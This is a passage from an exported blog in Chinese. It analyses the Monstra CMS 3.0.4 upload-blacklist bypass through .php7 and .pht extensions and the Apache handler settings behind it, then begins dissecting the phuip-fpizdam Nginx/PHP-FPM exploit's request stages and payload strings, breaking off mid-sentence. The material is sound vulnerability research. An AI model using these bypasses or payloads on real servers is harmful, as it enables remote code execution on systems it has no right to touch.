href=\"https://www.exploit-db.com/exploits/48479\">https://www.exploit-db.com/exploits/48479</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163025-7a69ee56-a0bd-1.png\" alt=\"a6b119cc4d4aa35e27b83fefd93fd78d.png\"></p>\n<p>poc中上传了一个名为shell.php7的后门文件</p>\n<p>后缀为php7的文件显然是可以绕过黑名单上传成功的，因为黑名单中只过滤了’php’,<br>‘phtml’, ‘php3’, ‘php4’, ‘php5’, ‘phps’，并未过滤php7后缀的文件上传。</p>\n<p>在黑名单里，除了php后缀的文件比较常见，’phtml’, ‘php3’, ‘php4’, ‘php5’,<br>‘phps’这些是什么？为什么要写入上传黑名单里，这些后缀的文件可以被执行吗？</p>\n<p>我们测试一下：</p>\n<p>在windows下的wamp环境（apache2.4.37）：</p>\n<p>php3后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163041-83ea5da8-a0bd-1.png\" alt=\"782b032b499ed0bf817d5f63d12f6e89.png\"></p>\n<p>可以被解析</p>\n<p>php5后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163055-8c6fec72-a0bd-1.png\" alt=\"9ed1072ced8aee311a68426fac4c2587.png\"></p>\n<p>不可以被解析</p>\n<p>php7后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163111-96043a7c-a0bd-1.png\" alt=\"705954217eaf37eb16955e4a11e7f213.png\"></p>\n<p>不可以被解析</p>\n<p>phtml后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163124-9d8878b2-a0bd-1.png\" alt=\"5a15738d7852f72a00a8feaf1bda9564.png\"></p>\n<p>不可以被解析</p>\n<p>再来看下Ubuntu下通过apt安装的环境（apache2.4.18）</p>\n<p>php3后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163135-a4788266-a0bd-1.png\" alt=\"cf301b9807e7370f2c87044393635f86.png\"></p>\n<p>可以被解析</p>\n<p>php5后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163147-aba75396-a0bd-1.png\" alt=\"e8b7fa17820bd058e0ac1b172b11e5d5.png\"></p>\n<p>可以被解析</p>\n<p>php7后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163158-b25380a2-a0bd-1.png\" alt=\"1a888a5437d121a79c10c09cff05c8ab.png\"></p>\n<p>可以被解析</p>\n<p>phtml后缀：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163210-b96931de-a0bd-1.png\" alt=\"ee84ec983118f4e8a67a1eac5d69e80d.png\"></p>\n<p>可以被解析</p>\n<p>在处理php5、php7以及phtml后缀时，两个不同系统下不同版本的apache有着不同的处理方式。首先来说说这些不同的后缀到底是什么，再从原理上来看看为什么会导致解析结果的不同</p>\n<p>据笔者猜测，不同的php后缀形式是用来标识此php文件的版本或者类型的</p>\n<p>例如后缀为phtml的文件：</p>\n<p>PHTML，正如其命名方式：是一种PHP脚本嵌在网页的HTML代码之中的文件。在页面被发送给请求的用户之前，后台服务器调用PHP来解释和执行PHP脚本。用后缀为phtml来标识这类php文件中嵌套着HTML代码</p>\n<p>例如后缀为php+数字的文件：</p>\n<p>用来标识当前php文件所采用的php开发版本，例如’php3’, ‘php4’, ‘php5’,<br>‘php7’对应了php的3、4、5、7版本号</p>\n<p>至于为什么没有php2呢？我查了一下php的历史版本</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163228-c3e53e32-a0bd-1.png\" alt=\"02312b54166d08e23d37e2a149e04990.png\"></p>\n<p>从历史记录来看，php3才是现在使用的php的第一个版本，因此从php3开始标记</p>\n<p>所以’phtml’, ‘php3’, ‘php4’, ‘php5’，只是用来标识这个php文件的特点，但是后台仍然要把这个当作php文件解析</p>\n<p>至于黑名单中并未过滤php7后缀的文件上传，可能是这套系统在开发时，php7还没有正式发行，开发者也就没有写入其中</p>\n<p>但是为什么后台可以把这些后缀的文件当成php文件来解析呢？上文对于php5以及php7、phtml的解析结果为什么不同呢？</p>\n<p>首先来看下windows下的apache关于后缀解析的配置，位于apache2.4.37/conf/mime.types</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163241-cbb52906-a0bd-1.png\" alt=\"c60b097e2358297d14fd511aa4ab6dfc.png\"></p>\n<p>此文件设置从文件扩展名到内容类型的默认映射列表。于此同时，httpd.conf通过提供大多数媒体类型定义以此简化mime.types文件，可以在httpd.conf中使用AddType指令根据需要进行指令覆盖。</p>\n<p>通过查看可以发现，mime.types这里并没有定义php相关的后缀应该如何解析，接着我们看下httpd.conf，位于：apache2.4.37/conf/httpd.conf</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163258-d59c398c-a0bd-1.png\" alt=\"b87fa57b3829db6185f30f0fda32a78f.png\"></p>\n<p>可以看到存在</p>\n<p>AddType application/x-httpd-php .php</p>\n<p>AddType application/x-httpd-php .php3</p>\n<p>这样的代码</p>\n<p>官网中关于AddType 的解释如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163311-ddc112a4-a0bd-1.png\" alt=\"ab8271a46676e5f496a475798e1a5a7a.png\"></p>\n<p>AddType <em>media-type</em> <em>extension</em> [<em>extension</em>] …</p>\n<p>该指令将给定的文件扩展名映射到指定的内容类型，media-type是用于包含extension的文件名的媒体类型。</p>\n<p>这里的配置将会在处理php和php3扩展名的文件将会被标记上applciation/x-httpd-php，将二者标识为可以执行php的文件类型。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163326-e64814ae-a0bd-1.png\" alt=\"137c440cf13bdcf7946a5619f21afdcd.png\"></p>\n<p>从这里可以发现，系统可以把php以及php3的后缀当成php进行解析，而php5、php7、phtml后缀由于没有配置，不可以被解析。</p>\n<p>接下来看一下Ubuntu下apache关于后缀解析的配置，位于/etc/mime.types</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163340-eeb8acfc-a0bd-1.png\" alt=\"152a4c2ac540ca6347f593654f0f2e54.png\"></p>\n<p>可以看到，里面定义了phtml、php3、php5扩展名到内容类型的映射列表，但是并没有php7。接下来看下/etc/apache2/mods-enabled/php7.0.conf</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163352-f5dc0b82-a0bd-1.png\" alt=\"ea8225ca1e6d43a5496d9a41348cd3d9.png\"></p>\n<p>注意看第一个FilesMatch</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163405-fdd299c8-a0bd-1.png\" alt=\"9026b4ce9a18c8e60d6a4aeb853a1fbc.png\"></p>\n<p>正则表达式.+\\.ph(p[3457]?|t|tml)$ 匹配到的扩展名，都将被标记上applciation/x-httpd-php，当成php文件解析。因此这里可以解析php7以及phtml后缀</p>\n<p>如果想要让windows环境下的apache解析php5以及php7扩展名，在apache2.4.37/conf/httpd.conf文件中添加如下两行即可</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163418-058c06fe-a0be-1.png\" alt=\"bb69baaf6abe2c091ce305d71dd5e848.png\"></p>\n<p>但是默认情况下，笔者的windows环境下的apache是无法解析php7扩展名的文件，因此这个漏洞对笔者的这个环境无效。</p>\n<p>那在笔者Ubuntu apache环境下，可以上传的poc除了可以以php7为后缀，还可以是什么形式呢？</p>\n<p>经过实验发现，Pht后缀也是可以的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163431-0d89f2da-a0be-1.png\" alt=\"3216eb122ea45fe1e2ef17d0a9b9d6cc.png\"></p>\n<p>黑名单里根本没有pht后缀限制，正则表达式正则表达式.+\\.ph(p[3457]?|t|tml)$也可以匹配到pht，因此pht后缀在笔者的环境中也可以被执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163447-16ee790e-a0be-1.png\" alt=\"6107078502027f19a212e57390fa1c93.png\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>MonstraCMS是一套基于PHP与XML的现代化的轻量级内容管理系统，整套系统无需使用数据库，据说是一家乌克兰的公司开发的。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528162937-5e159052-a0bd-1.png\" alt=\"3f350f22ae8e79de93d135f70c943233.png\"></p>\n<p>Monstra CMS 3.0.4版本中存在着一处安全漏洞，该漏洞源于程序没有正确验证文件扩展名。攻击者可以上传特殊后缀的文件执行任意PHP代码。但是通过分析后发现，这个漏洞的触发是依靠具体环境而来的，下文会详细介绍。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先看一下Monstra CMS的功能页面</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528162956-6970005e-a0bd-1.png\" alt=\"c6750d01e77be3bcee89221884863cb6.png\"></p>\n<p>可以发现有一个文件上传功能。通过阅读后台代码可知，程序是通过黑名单机制限制文件上传的类型：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163011-72336f82-a0bd-1.png\" alt=\"e5b8c37dbc5811e6c1eec837d184a4c7.png\"></p>\n<p>上图即是程序中用来限制上传的黑名单。程序不允许’html’, ‘htm’, ‘js’, ‘jsb’, ‘mhtml’, ‘mht’, ‘php’, ‘phtml’, ‘php3’, ‘php4’, ‘php5’, ‘phps’,’shtml’, ‘jhtml’, ‘pl’, ‘py’, ‘cgi’, ‘sh’, ‘ksh’, ‘bsh’, ‘c’, ‘htaccess’, ‘htpasswd’,’exe’, ‘scr’, ‘dll’, ‘msi’, ‘vbs’, ‘bat’, ‘com’, ‘pif’, ‘cmd’, ‘vxd’, ‘cpl’,’empty’后缀的文件上传</p>\n<p>这个黑名单看起来还是很完善的，几乎防范了所有的类型</p>\n<p>但是结合poc来看</p>\n<p><a href=\"https://www.exploit-db.com/exploits/48479\">https://www.exploit-db.com/exploits/48479</a></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163025-7a69ee56-a0bd-1.png\" alt=\"a6b119cc4d4aa35e27b83fefd93fd78d.png\"></p>\n<p>poc中上传了一个名为shell.php7的后门文件</p>\n<p>后缀为php7的文件显然是可以绕过黑名单上传成功的，因为黑名单中只过滤了’php’,<br>‘phtml’, ‘php3’, ‘php4’, ‘php5’, ‘phps’，并未过滤php7后缀的文件上传。</p>\n<p>在黑名单里，除了php后缀的文件比较常见，’phtml’, ‘php3’, ‘php4’, ‘php5’,<br>‘phps’这些是什么？为什么要写入上传黑名单里，这些后缀的文件可以被执行吗？</p>\n<p>我们测试一下：</p>\n<p>在windows下的wamp环境（apache2.4.37）：</p>\n<p>php3后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163041-83ea5da8-a0bd-1.png\" alt=\"782b032b499ed0bf817d5f63d12f6e89.png\"></p>\n<p>可以被解析</p>\n<p>php5后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163055-8c6fec72-a0bd-1.png\" alt=\"9ed1072ced8aee311a68426fac4c2587.png\"></p>\n<p>不可以被解析</p>\n<p>php7后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163111-96043a7c-a0bd-1.png\" alt=\"705954217eaf37eb16955e4a11e7f213.png\"></p>\n<p>不可以被解析</p>\n<p>phtml后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163124-9d8878b2-a0bd-1.png\" alt=\"5a15738d7852f72a00a8feaf1bda9564.png\"></p>\n<p>不可以被解析</p>\n<p>再来看下Ubuntu下通过apt安装的环境（apache2.4.18）</p>\n<p>php3后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163135-a4788266-a0bd-1.png\" alt=\"cf301b9807e7370f2c87044393635f86.png\"></p>\n<p>可以被解析</p>\n<p>php5后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163147-aba75396-a0bd-1.png\" alt=\"e8b7fa17820bd058e0ac1b172b11e5d5.png\"></p>\n<p>可以被解析</p>\n<p>php7后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163158-b25380a2-a0bd-1.png\" alt=\"1a888a5437d121a79c10c09cff05c8ab.png\"></p>\n<p>可以被解析</p>\n<p>phtml后缀：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163210-b96931de-a0bd-1.png\" alt=\"ee84ec983118f4e8a67a1eac5d69e80d.png\"></p>\n<p>可以被解析</p>\n<p>在处理php5、php7以及phtml后缀时，两个不同系统下不同版本的apache有着不同的处理方式。首先来说说这些不同的后缀到底是什么，再从原理上来看看为什么会导致解析结果的不同</p>\n<p>据笔者猜测，不同的php后缀形式是用来标识此php文件的版本或者类型的</p>\n<p>例如后缀为phtml的文件：</p>\n<p>PHTML，正如其命名方式：是一种PHP脚本嵌在网页的HTML代码之中的文件。在页面被发送给请求的用户之前，后台服务器调用PHP来解释和执行PHP脚本。用后缀为phtml来标识这类php文件中嵌套着HTML代码</p>\n<p>例如后缀为php+数字的文件：</p>\n<p>用来标识当前php文件所采用的php开发版本，例如’php3’, ‘php4’, ‘php5’,<br>‘php7’对应了php的3、4、5、7版本号</p>\n<p>至于为什么没有php2呢？我查了一下php的历史版本</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163228-c3e53e32-a0bd-1.png\" alt=\"02312b54166d08e23d37e2a149e04990.png\"></p>\n<p>从历史记录来看，php3才是现在使用的php的第一个版本，因此从php3开始标记</p>\n<p>所以’phtml’, ‘php3’, ‘php4’, ‘php5’，只是用来标识这个php文件的特点，但是后台仍然要把这个当作php文件解析</p>\n<p>至于黑名单中并未过滤php7后缀的文件上传，可能是这套系统在开发时，php7还没有正式发行，开发者也就没有写入其中</p>\n<p>但是为什么后台可以把这些后缀的文件当成php文件来解析呢？上文对于php5以及php7、phtml的解析结果为什么不同呢？</p>\n<p>首先来看下windows下的apache关于后缀解析的配置，位于apache2.4.37/conf/mime.types</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163241-cbb52906-a0bd-1.png\" alt=\"c60b097e2358297d14fd511aa4ab6dfc.png\"></p>\n<p>此文件设置从文件扩展名到内容类型的默认映射列表。于此同时，httpd.conf通过提供大多数媒体类型定义以此简化mime.types文件，可以在httpd.conf中使用AddType指令根据需要进行指令覆盖。</p>\n<p>通过查看可以发现，mime.types这里并没有定义php相关的后缀应该如何解析，接着我们看下httpd.conf，位于：apache2.4.37/conf/httpd.conf</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163258-d59c398c-a0bd-1.png\" alt=\"b87fa57b3829db6185f30f0fda32a78f.png\"></p>\n<p>可以看到存在</p>\n<p>AddType application/x-httpd-php .php</p>\n<p>AddType application/x-httpd-php .php3</p>\n<p>这样的代码</p>\n<p>官网中关于AddType 的解释如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163311-ddc112a4-a0bd-1.png\" alt=\"ab8271a46676e5f496a475798e1a5a7a.png\"></p>\n<p>AddType <em>media-type</em> <em>extension</em> [<em>extension</em>] …</p>\n<p>该指令将给定的文件扩展名映射到指定的内容类型，media-type是用于包含extension的文件名的媒体类型。</p>\n<p>这里的配置将会在处理php和php3扩展名的文件将会被标记上applciation/x-httpd-php，将二者标识为可以执行php的文件类型。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163326-e64814ae-a0bd-1.png\" alt=\"137c440cf13bdcf7946a5619f21afdcd.png\"></p>\n<p>从这里可以发现，系统可以把php以及php3的后缀当成php进行解析，而php5、php7、phtml后缀由于没有配置，不可以被解析。</p>\n<p>接下来看一下Ubuntu下apache关于后缀解析的配置，位于/etc/mime.types</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163340-eeb8acfc-a0bd-1.png\" alt=\"152a4c2ac540ca6347f593654f0f2e54.png\"></p>\n<p>可以看到，里面定义了phtml、php3、php5扩展名到内容类型的映射列表，但是并没有php7。接下来看下/etc/apache2/mods-enabled/php7.0.conf</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163352-f5dc0b82-a0bd-1.png\" alt=\"ea8225ca1e6d43a5496d9a41348cd3d9.png\"></p>\n<p>注意看第一个FilesMatch</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163405-fdd299c8-a0bd-1.png\" alt=\"9026b4ce9a18c8e60d6a4aeb853a1fbc.png\"></p>\n<p>正则表达式.+\\.ph(p[3457]?|t|tml)$ 匹配到的扩展名，都将被标记上applciation/x-httpd-php，当成php文件解析。因此这里可以解析php7以及phtml后缀</p>\n<p>如果想要让windows环境下的apache解析php5以及php7扩展名，在apache2.4.37/conf/httpd.conf文件中添加如下两行即可</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163418-058c06fe-a0be-1.png\" alt=\"bb69baaf6abe2c091ce305d71dd5e848.png\"></p>\n<p>但是默认情况下，笔者的windows环境下的apache是无法解析php7扩展名的文件，因此这个漏洞对笔者的这个环境无效。</p>\n<p>那在笔者Ubuntu apache环境下，可以上传的poc除了可以以php7为后缀，还可以是什么形式呢？</p>\n<p>经过实验发现，Pht后缀也是可以的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163431-0d89f2da-a0be-1.png\" alt=\"3216eb122ea45fe1e2ef17d0a9b9d6cc.png\"></p>\n<p>黑名单里根本没有pht后缀限制，正则表达式正则表达式.+\\.ph(p[3457]?|t|tml)$也可以匹配到pht，因此pht后缀在笔者的环境中也可以被执行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163447-16ee790e-a0be-1.png\" alt=\"6107078502027f19a212e57390fa1c93.png\"></p>\n"},{"title":"Nginx+PHP-FPM远程命令执行漏洞_EXP分析","date":"2019-11-04T08:14:49.000Z","cover":"https://s2.ax1x.com/2019/11/04/KxEii4.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nPHP 官方披露了Nginx + php-fpm 部分配置下存在的远程代码执行高危漏洞，攻击者可利用漏洞对目标网站进行远程代码执行攻击。\n\n本文只针对此次攻击所用到的EXP进行分析，并不涉及漏洞原理分析\n\n漏洞EXP下载地址\n\nhttps://github.com/neex/phuip-fpizdam\n\n<!--more-->\n\n## 流程\n\n### 两个重要的函数\n\n#### RequestWithQueryStringPrefix方法\n\nRequestWithQueryStringPrefix方法\n\n[![KxkPmT.md.png](https://s2.ax1x.com/2019/11/04/KxkPmT.md.png)](https://imgchr.com/i/KxkPmT)\n\nRequestWithQueryStringPrefix方法用来发送构造的get请求，该方法接收三个传入参数\n\npathInfo params prefix\n\n比较关键的参数是前两个，即pathInfo与params\n\n在发送数据包前，RequestWithQueryStringPrefix方法会用pathInfo与params计算与构造两部分数据\n\n1、GET 参数中补字符Q个数\n\nRequestWithQueryStringPrefix方法会计算qslPrime值用以在get请求参数中补”Q”字符，如下图\n\n[![Kxk9XV.md.png](https://s2.ax1x.com/2019/11/04/Kxk9XV.md.png)](https://imgchr.com/i/Kxk9XV)\n\nqslPrime值计算如下\n\n[![KxkQ0O.md.png](https://s2.ax1x.com/2019/11/04/KxkQ0O.md.png)](https://imgchr.com/i/KxkQ0O)\n\n可见是由params.QueryStringLength值、qslDelta值 prefix长度值计算得来\n\nparams.QueryStringLength，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得\n\nprefix值由RequestWithQueryStringPrefix方法用来调用时传入\n\n[![Kvb7Lt.md.png](https://s2.ax1x.com/2019/11/04/Kvb7Lt.md.png)](https://imgchr.com/i/Kvb7Lt)\n\nqslDelta值计算如下\n\n[![KvbbeP.md.png](https://s2.ax1x.com/2019/11/04/KvbbeP.md.png)](https://imgchr.com/i/KvbbeP)\n\n其中pathInfo为值由RequestWithQueryStringPrefix方法用来调用时传入，以baseStatus探测阶段为例(见下文)：\n\n![Kvbqdf.png](https://s2.ax1x.com/2019/11/04/Kvbqdf.png)\n\npathInfo：/path\\\\ninfo.php\n\nr.u.EscapedPath()值：\n\n![KvbLo8.png](https://s2.ax1x.com/2019/11/04/KvbLo8.png)\n\nr.u.EscapedPath()：/index.php\n\nu.EscapedPath()值计算如下：\n\nu := \\*r.u\n\nu.Path = u.Path + pathInfo\n\n在此例中，u.EscapedPath() 值为/index.php/path%0Ainfo.php\n\nqslDelta 最终长度计算可化简为：len(“%0A”)-len(“\\\\n”)=2\n\n此例中，qslPrime最终值为1499，如下图\n\n[![KvbXFS.md.png](https://s2.ax1x.com/2019/11/04/KvbXFS.md.png)](https://imgchr.com/i/KvbXFS)\n\n最终在GET请求参数部分补充1499个Q\n\n![KvbjJg.png](https://s2.ax1x.com/2019/11/04/KvbjJg.png)\n\n2、Header头D-Pisos字段补充等号个数\n\n[![KvbvWQ.md.png](https://s2.ax1x.com/2019/11/04/KvbvWQ.md.png)](https://imgchr.com/i/KvbvWQ)\n\nHeader头D-Pisos字段值计算如上，其中补充等号个数为params.PisosLength的值，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得\n\n最终发包如下\n\n[![Kvbxzj.md.png](https://s2.ax1x.com/2019/11/04/Kvbxzj.md.png)](https://imgchr.com/i/Kvbxzj)\n\n#### MakePathInfo方法\n\nMakePathInfo方法将传入的参数值前拼接/PHP_VALUE\\\\n，并赋值pi\n\n[![KvqSQs.md.png](https://s2.ax1x.com/2019/11/04/KvqSQs.md.png)](https://imgchr.com/i/KvqSQs)\n\n在计算PosOffset值(固定长为34)与pi长度差后，在pi字符串后拼接对应长度差个数的;\n\n如下图\n\n[![Kvq9Lq.md.png](https://s2.ax1x.com/2019/11/04/Kvq9Lq.md.png)](https://imgchr.com/i/Kvq9Lq)\n\n例如传入phpValue值为\\\\nsession.auto_start=1\n\n最终返回值为/PHP_VALUE\\\\nsession.auto_start=1;;;\n\n### baseStatus探测阶段\n\n发送位置：\n\n位于detect.go 32行\n\n[![KvqPe0.md.png](https://s2.ax1x.com/2019/11/04/KvqPe0.md.png)](https://imgchr.com/i/KvqPe0)\n\n发包次数：\n\n1次\n\n补位数据个数：\n\nQ个数1499、等号个数1\n\nPayload:\n\n/path\\\\ninfo.php\n\n数据包\n\n[![KvqiwV.md.png](https://s2.ax1x.com/2019/11/04/KvqiwV.md.png)](https://imgchr.com/i/KvqiwV)\n\n作用：通过这次发包，确定目标系统的baseStatus，如果本次发包返回状态码为200，则后续baseStatus为200\n\n详情：\n\nmain.go中82行处调用Detect\n\n[![KvqFoT.md.png](https://s2.ax1x.com/2019/11/04/KvqFoT.md.png)](https://imgchr.com/i/KvqFoT)\n\n[![KvqAFU.md.png](https://s2.ax1x.com/2019/11/04/KvqAFU.md.png)](https://imgchr.com/i/KvqAFU)\n\nDetect调用requester.Request发包\n\nrequester.Request方法如下\n\n[![KvqEYF.md.png](https://s2.ax1x.com/2019/11/04/KvqEYF.md.png)](https://imgchr.com/i/KvqEYF)\n\nrequester.Request调用RequestWithQueryStringPrefix方法发包\n\n[![KvqVW4.md.png](https://s2.ax1x.com/2019/11/04/KvqVW4.md.png)](https://imgchr.com/i/KvqVW4)\n\n通过本次发包返回的状态码，确定目标系统的baseStatus\n\n### Q字符长度候选值确认阶段\n\n发送位置：\n\n位于detect.go 47行\n\n[![KvqeSJ.md.png](https://s2.ax1x.com/2019/11/04/KvqeSJ.md.png)](https://imgchr.com/i/KvqeSJ)\n\n发包次数：\n\n91次\n\n补位数据个数：\n\nQ个数1499-1949步长5递增、等号个数1\n\nPayload:\n\n/PHP\\\\nis_the_shittiest_lang.php\n\n数据包\n\n[![Kvqml9.md.png](https://s2.ax1x.com/2019/11/04/Kvqml9.md.png)](https://imgchr.com/i/Kvqml9)\n\n作用：\n\n确认导致返回状态码异于baseStatus的Q长度加入qsl候选列表(qslCandidates)，候选列表中还有其长度减五以及减十这两个候选值\n\n详情：\n\n此处发包，位于一处for循环中\n\n其中MaxQSl、MinQSL、QSLDetectStep值如下图\n\n![KvqnyR.png](https://s2.ax1x.com/2019/11/04/KvqnyR.png)\n\n可见该循环一个可以循环91次\n\n![KvquO1.png](https://s2.ax1x.com/2019/11/04/KvquO1.png)\n\n仍然调用RequestWithQueryStringPrefix方法发包\n\n对应传入RequestWithQueryStringPrefix方法的pathInfo为BreakingPayload，params\n\n为ap\n\nBreakingPayload值如下图\n\n![KvqMex.png](https://s2.ax1x.com/2019/11/04/KvqMex.png)\n\nAp值如下图\n\n[![KvqQw6.md.png](https://s2.ax1x.com/2019/11/04/KvqQw6.md.png)](https://imgchr.com/i/KvqQw6)\n\n即对应的params.PisosLength值也就是补充等号个数为1，对应的params.QueryStringLength值为qsl，随循环递增\n\n[![KvqlTK.md.png](https://s2.ax1x.com/2019/11/04/KvqlTK.md.png)](https://imgchr.com/i/KvqlTK)\n\n当Q长度使得返回状态码异于baseStatus，将这个Q长度值保存到qslCandidates列表中\n\n### sanity check阶段 \n\n发送位置：\n\n位于detect.go 116行\n\n[![Kvq3FO.md.png](https://s2.ax1x.com/2019/11/04/Kvq3FO.md.png)](https://imgchr.com/i/Kvq3FO)\n\n发包次数：\n\n10次\n\n补位数据个数：\n\nQ个数1949、等号个数256\n\nPayload:\n\n/PHP\\\\nSOSAT\n\n数据包\n\n[![Kvq8YD.md.png](https://s2.ax1x.com/2019/11/04/Kvq8YD.md.png)](https://imgchr.com/i/Kvq8YD)\n\n作用：\n\n进行sanity check\n操作，当此处数据包返回状态码与baseStatus值相同，且header头部不存在包含PHPSESSID字符串的set-cookie字段时，通过检测，反之，程序结束\n\n详情：\n\nSanityCheck方法在Detect方法中调用,如下图\n\n[![KvqGfe.md.png](https://s2.ax1x.com/2019/11/04/KvqGfe.md.png)](https://imgchr.com/i/KvqGfe)\n\n可见此处也存在一个for循环，最多可以循环发包10次\n\n[![KvqYSH.md.png](https://s2.ax1x.com/2019/11/04/KvqYSH.md.png)](https://imgchr.com/i/KvqYSH)\n\nSanityCheck方法仍然调用RequestWithQueryStringPrefix方法，\n\n此时pathInfo为\"/PHP\\\\nSOSAT\"，params.PisosLength值为256，补256个等号\n\n循环发送10次\n\n[![Kvqtld.md.png](https://s2.ax1x.com/2019/11/04/Kvqtld.md.png)](https://imgchr.com/i/Kvqtld)\n\n检测sanity部分代码如下\n\n[![KvqN6A.md.png](https://s2.ax1x.com/2019/11/04/KvqN6A.md.png)](https://imgchr.com/i/KvqN6A)\n\n### Q字符长度以及等号个数确认阶段\n\n发送位置：\n\n位于detect.go 96行\n\n[![KvqUOI.md.png](https://s2.ax1x.com/2019/11/04/KvqUOI.md.png)](https://imgchr.com/i/KvqUOI)\n\n发包次数：\n\n最大50\\*3\\*256次，当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时终止发包\n\n补位数据个数：\n\nQ个数qslCandidates -1/ qslCandidates -5 -1/ qslCandidates -10 